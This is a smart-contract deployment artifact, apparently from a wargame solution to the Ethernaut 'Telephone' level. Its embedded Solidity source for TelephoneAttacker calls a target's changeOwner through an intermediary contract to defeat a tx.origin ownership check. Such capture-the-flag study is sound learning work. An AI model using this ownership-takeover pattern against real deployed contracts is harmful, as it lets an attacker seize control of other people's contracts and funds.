@@ -1,0 +1,100 @@
+{
+  "address": "0x1a9E43aCF0d0626D0872d2728b47B779db029C59",
+  "abi": [
+    {
+      "inputs": [],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_newowner",
+          "type": "address"
+        }
+      ],
+      "name": "attacker",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_contractAddress",
+          "type": "address"
+        }
+      ],
+      "name": "setContract",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "targetaddress",
+      "outputs": [
+        {
+          "internalType": "contract ITelephone",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x0930e25d26cfa85bde1ec57977c759376860e438bda68a76ae41ee9569011caa",
+  "receipt": {
+    "to": null,
+    "from": "0xcC6eDeB501BbD8AD9E028BDe937B63Cdd64A1D91",
+    "contractAddress": "0x1a9E43aCF0d0626D0872d2728b47B779db029C59",
+    "transactionIndex": 150,
+    "gasUsed": "136637",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x736cd52c2af1d4aa7623949aea5746c2e34ab2e53c05b2a39a8084b3ff56b20a",
+    "transactionHash": "0x0930e25d26cfa85bde1ec57977c759376860e438bda68a76ae41ee9569011caa",
+    "logs": [],
+    "blockNumber": 8157269,
+    "cumulativeGasUsed": "14993333",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [],
+  "numDeployments": 1,
+  "solcInputHash": "f8088d13374469f07fc41efb53c8346c",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newowner\",\"type\":\"address\"}],\"name\":\"attacker\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_contractAddress\",\"type\":\"address\"}],\"name\":\"setContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"targetaddress\",\"outputs\":[{\"internalType\":\"contract ITelephone\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/TelephoneAttacker.sol\":\"TelephoneAttacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/TelephoneAttacker.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface ITelephone {\\n    function changeOwner(address _owner) external;\\n}\\n\\ncontract TelephoneAttacker {\\n\\n    ITelephone public targetaddress;\\n    \\n    constructor() {\\n\\n    }\\n\\n    function setContract(address _contractAddress) public {\\n        targetaddress = ITelephone(_contractAddress);\\n    }\\n\\n    function attacker(address _newowner) public {\\n        targetaddress.changeOwner(_newowner);\\n    }\\n}\",\"keccak256\":\"0x8c310694f9523de9c1e001dc068e6955a85ce4650418f9c4a7812efd1e144ac0\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b50610182806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80631d9384161461004657806375f890ab1461005b578063b70b8bc41461008b575b600080fd5b61005961005436600461011c565b6100ba565b005b61005961006936600461011c565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b60005461009e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005460405163a6f9dae160e01b81526001600160a01b0383811660048301529091169063a6f9dae190602401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b5050505050565b60006020828403121561012e57600080fd5b81356001600160a01b038116811461014557600080fd5b939250505056fea2646970667358221220ad5f2ff0c55bb8632972345b171d0ded354735a2eae91dba4b00566aad1fe0d564736f6c63430008140033",
+  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100415760003560e01c80631d9384161461004657806375f890ab1461005b578063b70b8bc41461008b575b600080fd5b61005961005436600461011c565b6100ba565b005b61005961006936600461011c565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b60005461009e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005460405163a6f9dae160e01b81526001600160a01b0383811660048301529091169063a6f9dae190602401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b5050505050565b60006020828403121561012e57600080fd5b81356001600160a01b038116811461014557600080fd5b939250505056fea2646970667358221220ad5f2ff0c55bb8632972345b171d0ded354735a2eae91dba4b00566aad1fe0d564736f6c63430008140033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 195,
+        "contract": "contracts/TelephoneAttacker.sol:TelephoneAttacker",
+        "label": "targetaddress",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(ITelephone)192"
+      }
+    ],
+    "types": {
+      "t_contract(ITelephone)192": {
+        "encoding": "inplace",
+        "label": "contract ITelephone",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
